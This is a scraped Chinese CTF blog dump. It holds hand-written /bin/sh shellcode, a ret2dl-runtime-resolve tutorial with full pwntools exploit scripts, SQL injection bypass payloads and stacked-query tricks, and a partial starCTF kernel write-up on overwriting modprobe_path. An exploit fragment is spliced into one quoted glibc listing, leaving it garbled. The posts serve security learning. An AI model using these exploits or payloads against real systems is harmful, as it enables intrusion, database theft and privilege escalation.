所以根据上面的要求进行修改就好push 0x68732fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxxor eax,eaxmov al,0xbint 0x80\n\n&gt;&gt;&gt; len(&#x27;\\x68\\x2F\\x73\\x68\\x00\\x68\\x2F\\x62\\x69\\x6E\\x89\\xE3\\x31\\xC9\\x31\\xD2\\x31\\xC0\\xB0\\x0B\\xCD\\x80&#x27;)22\n\n可以看到我们就只需要22字节了省了一半，当然还可以更简短，自己下去写\namd64pwntools&gt;&gt;&gt; context.arch=&#x27;amd64&#x27;&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    mov rax, 0x732f2f2f6e69622f    push rax    mov rdi, rsp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push b&#x27;sh\\x00&#x27; */    push 0x1010101 ^ 0x6873    xor dword ptr [rsp], 0x1010101    xor esi, esi /* 0 */    push rsi /* null terminate */    push 8    pop rsi    add rsi, rsp    push rsi /* &#x27;sh\\x00&#x27; */    mov rsi, rsp    xor edx, edx /* 0 */    /* call execve() */    push SYS_execve /* 0x3b */    pop rax    syscall&gt;&gt;&gt; \n\n这里的思路和x86是一样的只是使用的寄存器不相同\n自己编写x86 shellcode# 其实根据上面的可以看出来我们需要满足的条件有以下几条# rdi=/bin/sh# rsi=0# rdx=0# rax=0x3b     (系统调用号，后面有系统调用号很全的网站)# syscall      这里和x86有点区别# 所以根据上面的要求进行修改就好mov rbx,0x68732f6e69622fpush rbxpush rsppop rdixor rsi,rsixor rdx,rdxmov rax,0x3bsyscall\n\n&gt;&gt;&gt; len(&#x27;\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x53\\x54\\x5F\\x48\\x31\\xF6\\x48\\x31\\xD2\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x0F\\x05&#x27;)28&gt;&gt;&gt;\n\n也少了很多哈，同样也不是最少的，可以去网上搜或则自己写\n32位和64位系统调用表\nhttps://blog.k0nashi.cn/2021/09/14/syscall-table/\n","categories":["pwn"],"tags":["shellcode编写"]},{"title":"ret2dl-runtime-resolve","url":"/2022/02/03/ret2dl-runtime-resolve/","content":"前段时间因为身体原因摆烂了一周多了，今天又才重新开始做题，报了几场比赛都没能打成就很烦。\nret2dl-runtime-resolve首先ELF文件的引用外部文件的加载方式分为三种FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在后面两种的情况下存在地址延迟加载。\nNO_RELRO\n可以看到在第一次调用read函数的时候，此时会先根据GOT表的位置进行jmp到read@plt+6的位置，然后经过两次push之后到_dl_runtime_resolve函数。\n在源码中dl_runtime_resolve函数只是call了一下_dl_fixup函数。\n#ifndef reloc_offset  # define reloc_offset reloc_arg  # define reloc_index  reloc_arg / sizeof (PLTREL)  #endif  DL_FIXUP_VALUE_TYPE  attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  _dl_fixup (  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS      ELF_MACHINE_RUNTIME_FIXUP_ARGS,  # endif      struct link_map *l, ElfW(Word) reloc_arg) &#123;      //获取symtab（存放dynsym的数组）      const ElfW(Sym) *const symtab          = (const void *) D_PTR (l, l_info[DT_SYMTAB]);      //获取strtab(存放符号名的数组)       const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);      //获取reloc_arg对应的rel.plt项       const PLTREL *const reloc          = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);      //获取reloc_arg对应的dynsym       const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      const ElfW(Sym) *refsym = sym;      //指向对应的got表，以便将解析结果写回去       void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);      lookup_t result;      DL_FIXUP_VALUE_TYPE value;        /* Sanity check that we&#x27;re really looking at a PLT relocation.  */      assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);        /* Look up the target symbol.  If the normal lookup rules are not        used don&#x27;t look in the global scope.  */      if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          const struct r_found_version *version = NULL;            if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123;              const ElfW(Half) *vernum =                  (const void *) D_PTR (l, l_info[VERSYMID# payload = p64(0)+p64(0x4011DD)+b&#x27;\\x00&#x27;*(0x58-0x10)+p64(fake_dynrel_addr) + \\#     p64(pop_rdi)+p64(bss+0xa0-0x8) +\\#     p64(plt_load)+p64(fake_link_map_addr)+p64(0)# payload = payload.ljust(0xa0-8, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27; + \\#     p64(bss+0x58)+p64(leave_ret)# gdb.attach(r)X (DT_VERSYM)]);              ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;              version = &amp;l-&gt;l_versions[ndx];              if (version-&gt;hash == 0)                  version = NULL;          &#125;            /* We need to keep the scope around so do some locking.  This is         not necessary for objects which cannot be unloaded or when          we are not using any threads (yet).  */          int flags = DL_LOOKUP_ADD_DEPENDENCY;          if (!RTLD_SINGLE_THREAD_P) &#123;              THREAD_GSCOPE_SET_FLAG ();              flags |= DL_LOOKUP_GSCOPE_LOCK;          &#125;    #ifdef RTLD_ENABLE_FOREIGN_CALL          RTLD_ENABLE_FOREIGN_CALL;  #endif          //根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中           result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                                        version, ELF_RTYPE_CLASS_PLT, flags, NULL);            /* We are done with the global scope.  */          if (!RTLD_SINGLE_THREAD_P)              THREAD_GSCOPE_RESET_FLAG ();    #ifdef RTLD_FINALIZE_FOREIGN_CALL          RTLD_FINALIZE_FOREIGN_CALL;  #endif            //得到结果           value = DL_FIXUP_MAKE_VALUE (result,                                       sym ? (LOOKUP_VALUE_ADDRESS (result)                                              + sym-&gt;st_value) : 0);      &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;      &#125;        /* And now perhaps the relocation addend.  */      value = elf_machine_plt_value (l, reloc, value);        if (sym != NULL              &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))          value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));        /* Finally, fix up the plt itself.  */      if (__glibc_unlikely (GLRO(dl_bind_not)))          return value;      //将结果写回到got表中       return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  &#125;  \n\n根据源码内容可以看出来解析时是根据符号名的字符串来解析函数的。\n#include &lt;unistd.h&gt;  #include &lt;string.h&gt;  void fun()&#123;      char buffer[0x20];      read(0,buffer,0x200);  &#125;  int main()&#123;      fun();      return 0;  &#125;  // gcc test.c -z norelro -no-pie -fno-stack-protector -m32 -o ret2dlsolve2  \n\n现在我们创建这样一个漏洞程序。\n在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造dynstr。\n\n可以看到上面是有可读可写的权限的。\n\n指向的位置存在这样几个字符串。\nexp如下:\nfrom pwn import *r = process(&#x27;./ret2dlsolve2&#x27;)elf = ELF(&#x27;./ret2dlsolve2&#x27;)pop_ebp = 0x0804848bleave_ret = 0x08048358read_plt = elf.plt[&#x27;read&#x27;]read_plt_load = elf.plt[&#x27;read&#x27;]+6bss = elf.bss()target = 0x804961C+4payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x300) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(0x1000)r.sendline(payload)fake_str = b&#x27;\\x00libc.so.6\\x00_IO_stdin_used\\x00system\\x00&#x27;payload = b&#x27;a&#x27;*0x4+p32(read_plt)+p32(read_plt_load) + \\    p32(0)+p32(target)+p32(0x100)payload = payload.ljust(0x50, b&#x27;\\x00&#x27;)+fake_strr.sendline(payload)payload = p32(bss+0x350)+b&#x27;;sh&#x27;r.sendline(payload)r.interactive()\n\n64位相较于32位比较类似，又因为参数是在寄存器内保存的所以，直接一次ROP即可解决。\nPARTIAL_RELRO首先再更深层次的观察_dl_runtime_resolve函数的作用。\n\n这一步和上面一样，但是上面没有提到这两个push的作用，先继续往后看。\n\n上面的0是reloc_arg，下面的0xf7ffd918则是link_map的地址。\n\n通过这个地址即可找到.dynamic的地址，也就是上图中的第三个\n\n.dynamic：是ld.so使用的动态链接信息，在/etc/ld.so.conf文件中存放着需要动态加载的目录，使用ldconfig就可以将ld.so.conf中的指定目录的库文件加载到内存中，并记录在/etc/ld.so.cache文件中。ld.so.1文件就可以在高速缓存中访问动态库文件，提高访问速度。导入动态链接库，可以在/etc/ld.so.conf文件中配置，或者使用LD_LIBRARY_PATH环境变量进行引用。\n\n再根据.dynamic的地址找到另外几个结构的地址\n\n其中的地址信息是:\n.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x0804821c\n\n.dynstr：动态链接的字符串表，保存动态链接所需的字符串。比如符号表中的每个符号都有一个 st_name(符号名)，他是指向字符串表的索引，这个字符串表可能就保存在 .dynstr，而.dynstr结构为正常的字符串数组。\n\n.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481cc\n\n.dynsym：动态链接的符号表，保存需要动态连接的符号表，而.dynsym结构如下\n\ntypedef struct&#123;  Elf32_Word    st_name; //符号名相对.dynstr起始的偏移    Elf32_Addr    st_value;  Elf32_Word    st_size;  unsigned char st_info;  unsigned char st_other;  Elf32_Section st_shndx;&#125;Elf32_Sym; \n\n.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048298\n\n.rel.plt：节的每个表项对应了所有外部过程调用符号的重定位信息。而.rel.plt结构如下\n\ntypedef struct&#123;  Elf32_Addr r_offset;//指向GOT表的指针，即该函数在got表的偏移  Elf32_Word r_info;&#125;Elf32_Rel\n\n.rel.plt 的地址加上参数 reloc_arg，即 0x08048298 + 0 -&gt; 0x08048298\n找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel\n\n通过rel就可以获得Elf32_Rel结构体的数据\nr_offset=0x0804a00c;r_info=0x00000107;\n\n将r_info&gt;&gt;8得到4也就得到了.dynsym中的下标。\n\n从上往下从0开始，找到与下标相同的行获得第一列的数据根据即为name_offset\n\n为什么是第一列是因为第一列的值其实就是上面写的偏移\n再根据.dynstr+name_offset获得函数名的字符串。\n\n最后再根据得到的字符串来执行函数。\n梳理一下1.首先push两个参数进入，随后执行_dl_runtime_resolve\n2.根据link_map找到.dynamic地址\n3.根据.dynamic找到.dynstr    .dynsym     .rel.plt\n4.根据reloc_arg找到Elf32_Rel的指针rel\n5.拿到r_info经过移位拿到index\n6.根据index拿到name_offset结合.dynstr计算出函数的名字\n\nrel_addr = .rel.plt_addr + reloc_arg\nfake_rel_addr = .rel.plt_addr + fake_reloc_arg\nfake_reloc_arg = fake_rel_addr - rel_addr + reloc_arg\n根据以上简单的运算就可以实现伪造rel的地址\n\n\nname_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+.dynsym_addr\nfake_name_offset_addr=((r_info - 0x7)&gt;&gt;8)*0x10+fake_dynsym_addr\nr_info = (((fake_dynsym_addr - .dynsym_addr) / 16) &lt;&lt; 8) + 0x7\n这里伪造出rel当中的r_info的值\n\n\n根据上面ida调试的截图很容易可以看出来dynsym的伪造很简单只需要按照原本的模式写就行\nfake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)\n\n最终构造exp\nfrom pwn import *r = process(&#x27;./ret2dlsolve&#x27;)elf = ELF(&#x27;./ret2dlsolve&#x27;)read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x80482d0leave_ret = 0x08048378pop_ebp = 0x080484abdynstr_addr = 0x0804821cdynsym_addr = 0x080481ccrel_addr = 0x08048298bss = elf.bss()payload = b&#x27;a&#x27;*(0x28+0x4)+p32(pop_ebp)+p32(bss+0x800) + \\    p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x800)+p32(0x1000)r.sendline(payload)fake_dynsym_addr = bss+0x910system_str = bss+0x900fake_rel = p32(read_got) + \\    p32((((fake_dynsym_addr - dynsym_addr) // 16) &lt;&lt; 8) + 0x7)fake_dynsym = p32(system_str - dynstr_addr)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)fake_rel_addr = fake_dynsym_addr+len(fake_dynsym)bin_sh_addr = bss+0x900+len(b&#x27;system\\x00&#x27;)payload = b&#x27;a&#x27;*0x4+p32(read_load_plt)+p32(fake_rel_addr -                                          rel_addr)+p32(0)+p32(bin_sh_addr)payload += payload.ljust(0x100, b&#x27;\\x00&#x27;) + \\    b&#x27;system\\x00/bin/sh&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)payload += fake_dynsym+fake_relr.sendline(payload)r.interactive()\n\n下面是64位的情况，64位不能直接伪造rel.plt\nif (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)   &#123;     const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;     version = &amp;l-&gt;l_versions[ndx];     if (version-&gt;hash == 0)       version = NULL;   &#125; \n\n这里，出现了访问未映射的内存，主要原因就是reloc-&gt;r_info过大，bss段一般所在位置在0x600000然而真正的rel.plt一般在0x400000。\nif (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123;          ...  &#125; else &#123;          /* We already found the symbol.  The module (and therefore its load         address) is also known.  */          value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);          result = l;  &#125;  \n\n解决办法是绕过这个if判断进入else。\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym;  \n\n如果我们伪造link_map，让sym-&gt;value为某一个已经解析了的函数地址，让l-&gt;addr为我们需要的函数地址到已知函数地址的偏移，那么l-&gt;l_addr + sym-&gt;st_value也就等于我们需要的函数地址。\n比如，如果我们把read_got-8处当作sym那么sym-&gt;st_value也就等于read的地址，并且st_other正好也不为0，同时绕过了if，一举两得。\n此时的rel结构为:\ntypedef struct&#123;  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */&#125; Elf64_Rela;/* How to extract and insert information held in the r_info field.  */#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))\n\n\n在动态调试也可以看到raed在符号表中的偏移为1(0x100000007&gt;&gt;32)\n还有注意的就是我们需要伪造这个数组里的几个指针，它们分别是\nDT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)\nDT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)\nDT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)\n(其实我也不知道怎么调用的system，我猜测是因为DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);这句话的原因吧，希望知道的大师傅可以评论一下)\n综上得出exp:\nfrom pwn import *r = process(&#x27;./ret2dlsolve_64&#x27;)elf = ELF(&#x27;./ret2dlsolve_64&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)pop_rdi = 0x00000000004005c3pop_rsi_r15 = 0x00000000004005c1read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]read_load_plt = 0x4003f6bss = elf.bss()l_addr = libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi)+p64(0) + \\    p64(pop_rsi_r15)+p64(bss+0x100)+p64(0) + \\    p64(read_plt)+p64(elf.symbols[&#x27;fun&#x27;])r.sendline(payload)dynstr_addr = 0x400318 # str tablefake_link_map_addr = bss+0x100r_offset = fake_link_map_addr + l_addr * -1 - 8l_addr = l_addr &amp; (2**64-1)fake_strtab = p64(0)+p64(dynstr_addr)fake_strtab_addr = fake_link_map_addr+0x8fake_symtab = p64(0)+p64(read_got-0x8)fake_symtab_addr = fake_link_map_addr+0x18fake_dynrel_addr = fake_link_map_addr+0x28fake_rel_addr = fake_link_map_addr+0x38fake_dynrel = p64(0)+p64(fake_rel_addr)fake_rel = p64(r_offset)+p64(0x7)+p64(0)fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_relfake_link_map = fake_link_map.ljust(0x68, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)fake_link_map = fake_link_map.ljust(0xf8,b&#x27;\\x00&#x27;)+p64(fake_dynrel_addr)fake_link_map = fake_link_map.ljust(0x100,b&#x27;\\x00&#x27;)+b&#x27;/bin/sh&#x27;r.sendline(fake_link_map)bin_sh_addr = fake_link_map_addr+0x100payload = b&#x27;a&#x27;*(0x20+0x8)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(read_load_plt) + \\    p64(fake_link_map_addr)+p64(0)r.sendline(payload)r.interactive()\n\n参考链接https://blog.csdn.net/seaaseesa/article/details/104478081\nhttps://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#second-try-no-leak\nhttps://blog.csdn.net/jzc020121/article/details/116312592#t3\n","categories":["pwn"],"tags":["ret2dl-runtime-resolve"]},{"title":"SQL注入的一些小知识点","url":"/2021/09/17/sqlinjery/","content":"绕过的内容总结得较为完整的网站:\nhttps://www.cnblogs.com/Vinson404/p/7253255.html\n  拆开： 1919810931114514+words 1919810931114514:flag words:id+data;  alter tables words rename to words1; 1919810931114514+words1;  alter tables `1919810931114514` rename to words ;words+words1;  alter tables words change flag id varchar(50); #\n\n上面是从给后端处理的值来看，上传的数值为int类型可以改变原本表的表名以及字段名，再用mysql的万能绕过语句\n&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;\n\n预编译这个还看不懂\n有过滤–或则#还是–和#都过滤时，可以使用\n1&#x27; 注入语句 or &#x27;1&#x27;=&#x27;1    这种绕过引号的方式也算是及其嚣张了\n\n空格的 URL 编码替代方法:　　　　　　%09 TAB(水平)　　　　　　%0a 新建一行　　　　　　%0c 新的一页　　　　　　%0d return功能　　　　　　%0b TAB(垂直)      （php-5.2.17,5,3,29成功）　　　　　　%a0 空格\n\n\nmysql的约束问题\n\nmysql的在实验之后，admin是可以以admin加一个加空格来写入\n\n\n无列名注入\n\n1&#x27; and (select * from(select * from 表名 as a join 表名 as b) as c)--+;1&#x27; and (select * from(select * from 表名 as a join 表名 as b using(第一个字段)) as c)--+;1&#x27; and (select * from(select * from 表名 as a join 表名 as b using(第一个字段，第二个字段)) as c)--+;\n\n// 一种基于bool值的无列表名注入假设 flag 为 flag &#123;bbbbb&#125;，对于 payload 这个两个 select 查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大，这个不难懂，和 c 语言的 strcmp() 函数原理一样MariaDB [test]&gt; select * from flag;+----+-----------------------+| id | flag                  |+----+-----------------------+|  1 | flag&#123;this_is_a_test!&#125; |+----+-----------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;e&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;e&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              0 |+--------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;f&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;f&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              0 |+--------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; select ((1,&#x27;g&#x27;)&gt;(select * from flag));+--------------------------------+| ((1,&#x27;g&#x27;)&gt;(select * from flag)) |+--------------------------------+|                              1 |+--------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ((1,&#x27;fm&#x27;)&gt;(select * from flag));+---------------------------------+| ((1,&#x27;fm&#x27;)&gt;(select * from flag)) |+---------------------------------+|                               1 |+---------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select ((1,&#x27;fl&#x27;)&gt;(select * from flag));+---------------------------------+| ((1,&#x27;fl&#x27;)&gt;(select * from flag)) |+---------------------------------+|                               0 |+---------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; \n\n\n堆叠注入\n\n源码:$sql=&quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;;\n\nMariaDB [test]&gt; select * from test;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | admin      | flag1    ||  2 | admin      | flag1    ||  3 | database() | test     |+----+------------+----------+3 rows in set (0.001 sec)MariaDB [test]&gt; select 1||username from test;+-------------+| 1||username |+-------------+|           1 ||           1 ||           1 |+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt; select id,1||username from test;+----+-------------+| id | 1||username |+----+-------------+|  1 |           1 ||  2 |           1 ||  3 |           1 |+----+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt; select password,1||username from test;+----------+-------------+| password | 1||username |+----------+-------------+| flag1    |           1 || flag1    |           1 || test     |           1 |+----------+-------------+3 rows in set (0.000 sec)MariaDB [test]&gt; select *,1||username from test;+----+------------+----------+-------------+| id | username   | password | 1||username |+----+------------+----------+-------------+|  1 | admin      | flag1    |           1 ||  2 | admin      | flag1    |           1 ||  3 | database() | test     |           1 |+----+------------+----------+-------------+3 rows in set (0.001 sec)MariaDB [test]&gt;\n\n解法二：\nset sql_mode=PIPES_AS_CONCAT  # 让管道符作为concat1;set sql_mode=PIPES_AS_CONCAT;selet 1结合源码就是:select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag;\n\n\n不使用select查表\n\nhandler table_name open;handler table_name first;handler table_name next;handler table_name next;handler table_name next;...handler table_name close;\n\n","categories":["web"],"tags":["sql"]},{"title":"starCTF 2019 hackme","url":"/2022/08/10/starCTF-2019-hackme/","content":"题目分析这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下\n__int64 __fastcall hackme_ioctl(__int64 a1, unsigned int a2, __int64 a3)&#123;    __int64 v3; // rax    __int64 v4; // rsi    __int64 *v5; // rax    __int64 v7; // rax    __int64 v8; // rdi    __int64 *v9; // rax    __int64 size; // r12    __int64 content; // r13    __int64 *v12; // rbx    __int64 v13; // rbx    __int64 v14; // rdi    __int64 *v15; // rbx    __int64 v16; // rax    arg v17; // [rsp+0h] [rbp-38h] BYREF    copy_from_user(&amp;v17, a3, 0x20LL);    if ( a2 == 0x30001 )    &#123;        v13 = 2LL * LODWORD(v17.idx);        v14 = pool[v13];        v15 = &amp;pool[v13];        if ( v14 )        &#123;            kfree();            *v15 = 0LL;            return 0LL;        &#125;        return -1LL;    &#125;    if ( a2 &gt; 0x30001 )    &#123;        if ( a2 == 0x30002 )        &#123;            v7 = 2LL * LODWORD(v17.idx);            v8 = pool[v7];            v9 = &amp;pool[v7];            if ( v8 &amp;&amp; v17.offset + v17.size &lt;= (unsigned __int64)v9[1] )            &#123;                copy_from_user(v17.offset + v8, v17.content, v17.size);                return 0LL;            &#125;        &#125;        else if ( a2 == 0x30003 )        &#123;            v3 = 2LL * LODWORD(v17.idx);            v4 = pool[v3];            v5 = &amp;pool[v3];            if ( v4 )            &#123;                if ( v17.offset + v17.size &lt;= (unsigned __int64)v5[1] )                &#123;                    copy_to_user(v17.content, v17.offset + v4, v17.size);                    return 0LL;                &#125;            &#125;        &#125;        return -1LL;    &#125;    if ( a2 != 0x30000 )        return -1LL;    size = v17.size;    content = v17.content;    v12 = &amp;pool[2 * LODWORD(v17.idx)];    if ( *v12 )        return -1LL;    v16 = _kmalloc(v17.size, 0x6000C0LL);    if ( !v16 )        return -1LL;    *v12 = v16;    copy_from_user(v16, content, size);    v12[1] = size;    return 0LL;&#125;\n\n00000000 arg struc ; (sizeof=0x20, mappedto_4)   ; XREF: hackme_ioctl/r00000000 idx dq ?                                ; XREF: hackme_ioctl+46/r00000000                                         ; hackme_ioctl:loc_8E/r ...00000008 content dq ?                            ; XREF: hackme_ioctl+51/r00000008                                         ; hackme_ioctl+99/r ...00000010 size dq ?                               ; XREF: hackme_ioctl+4D/r00000010                                         ; hackme_ioctl+95/r ...00000018 offset dq ?                             ; XREF: hackme_ioctl+49/r00000018                                         ; hackme_ioctl+91/r00000020 arg ends\n\n下面是分析出来的结构体，可以看到题目实现了四个较为基本的功能，增加堆块，删除堆块，修改堆块，读取堆块。\n漏洞分析这里需要注意的对于读写的时候检测offset的方式是 offset+size&lt;(unsigned __int64)size 这里可以看出来存在向上溢出任意地址的读和写。\nkernel使用的堆分配机制是Buddy System和Slab分配器。而Slab分配器是类似于ptmalloc中的fastbin。kmem_cache_cpu中的freelist指向一个slab中第一个空闲的object，接着object存在指针指向后面空闲的object。而这个指针是很类似于fastbin，我们如果修改的话可以实现任意地址分配堆块。\nmodprobe_path利用原理首先，什么是modprobe呢？根据维基百科的说法：“modprobe是一个Linux程序，最初由Rusty Russell编写，用于在Linux内核中添加一个可加载的内核模块，或者从内核中移除一个可加载的内核模块”。也就是说，它是我们在Linux内核中安装或卸载新模块时都要执行的一个程序。该程序的路径是一个内核全局变量，默认为/sbin/modprobe\nmodprobe的路径, 默认是/sbin/modprobe, 存放在内核本身的符号modprobe_path下, 同时，它位于一个可写的内存页中。我们可以通过读取/proc/kallsyms得到它的地址\n其次，当我们执行的文件的类型是系统未知的类型时，将执行modprobe程序（其路径存储在modprobe_path中）。 更准确地说，如果我们对文件签名（又称魔术头）为系统未知的文件调用execve()函数时，它将调用下列函数，并最终调用modprobe\ndo_execve()=&gt;do_execveat_common()=&gt;bprm_execve()=&gt;exec_binprm()=&gt;search_binary_handler()=&gt;request_module()=&gt;call_modprobe()\n所有这些调用最终将执行下面的代码：\nstatic int call_modprobe(char *module_name, int wait)&#123;\tstruct subprocess_info *info;\tstatic char *envp[] = &#123;\t\t&quot;HOME=/&quot;,\t\t&quot;TERM=linux&quot;,\t\t&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;,\t\tNULL\t&#125;;\tchar **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);\tif (!argv)\t\tgoto out;\tmodule_name = kstrdup(module_name, GFP_KERNEL);\tif (!module_name)\t\tgoto free_argv;\targv[0] = modprobe_path;\targv[1] = &quot;-q&quot;;\targv[2] = &quot;--&quot;;\targv[3] = module_name;\t/* check free_modprobe_argv() */\targv[4] = NULL;\tinfo = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,\t\t\t\t\t NULL, free_modprobe_argv, NULL);\tif (!info)\t\tgoto free_module_name;\treturn call_usermodehelper_exec(info, wait | UMH_KILLABLE);free_module_name:\tkfree(module_name);free_argv:\tkfree(argv);out:\treturn -ENOMEM;&#125;\n\n在这篇文章中 kernel pwn内存任意读写提升权限[2] 提到了call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。然而这个函数的定义可以看出来也是调用了call_usermodehelper_setup和call_usermodehelper_exec，所以猜测这一函数也可以达到一样的效果，结果也证明事实确实如此\nint call_usermodehelper(char *path, char **argv, char **envp, int wait)&#123;\tstruct subprocess_info *info;\tgfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;\tinfo = call_usermodehelper_setup(path, argv, envp, gfp_mask,\t\t\t\t\t NULL, NULL, NULL);\tif (info == NULL)\t\treturn -ENOMEM;\treturn call_usermodehelper_exec(info, wait);&#125;\n\n利用思路所以我们的思路就是覆盖掉modprobe_path值为我们期望的值即可。\n那么首先还是需要泄露地址，这里泄露堆地址就不再提了，存在向上任意溢出所以随便怎么泄露都可。\n内核基址的读取需要一点猜测的成分在，可知0号内存0xffff88800017a500之前是已经在用的系统块，那么一定存在一些内核的指针。\n\n\n可以看到这上面确实存在一个固定函数地址，所以可以跟他计算出基地值。\n虽然我们可以直接泄露出来modprobe_path的地址，并且实现任意分配堆地址分配到指定位置，但是这样会破坏很多周围的数据，我们的想法肯定是值修改modprobe_path的值，所以我们还需要进一步利用。接下来的思路就是将堆块分配到pool上，那么我们就可以篡改pool上的堆指针为modprobe_path的地址，那我们就可以只修改他的值了，那么现在的问题是怎么获取到pool的值呢？\n\n在mod_tree内存的附近处会存留驱动的地址\n\n所以我们可以任意堆分配到这里然后泄露出驱动地址，紧接着任意堆分配到pool最后修改pool中的指针为modprobe_path地址，最后修改modprobe_path的值即可\n综上，exp#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;struct Arg&#123;    long int idx;    char *content;    long 